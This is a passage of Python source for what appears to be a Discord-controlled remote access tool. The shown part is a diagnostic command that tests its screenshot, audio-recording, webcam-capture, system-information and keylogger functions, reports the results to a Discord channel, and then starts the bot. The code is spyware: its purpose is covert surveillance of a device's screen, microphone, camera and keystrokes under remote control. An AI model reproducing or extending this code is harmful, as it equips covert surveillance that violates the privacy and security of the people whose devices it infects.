    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 Screenshot: FAIL\n{str(e)}\n```{tb}```')
    # audio test
    try:
        path = record_audio(duration=1)
        results.append('🟢 Audio Recording: OK')
        os.remove(path)
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 Audio Recording: FAIL\n{str(e)}\n```{tb}```')
    # cam test
    try:
        path = take_webcam_photo()
        if path:
            results.append('🟢 Camera: OK')
            os.remove(path)
        else:
            results.append('🔴 Camera: FAIL\nNo photo captured (device not found or permission denied)')
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 Camera: FAIL\n{str(e)}\n```{tb}```')
    # sys info test
    try:
        info = get_system_info()
        results.append('🟢 System Info: OK')
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 System Info: FAIL\n{str(e)}\n```{tb}```')
    # Keylogger test (jst checking import, listener)
    try:
        from pynput import keyboard
        results.append('🟢 Keylogger: OK (import)')
    except Exception as e:
        tb = traceback.format_exc()
        results.append(f'🔴 Keylogger: FAIL\n{str(e)}\n```{tb}```')
    await interaction.followup.send('\n'.join(results))

# run the bot
logger.info('Starting bot...')
bot.run(TOKEN) 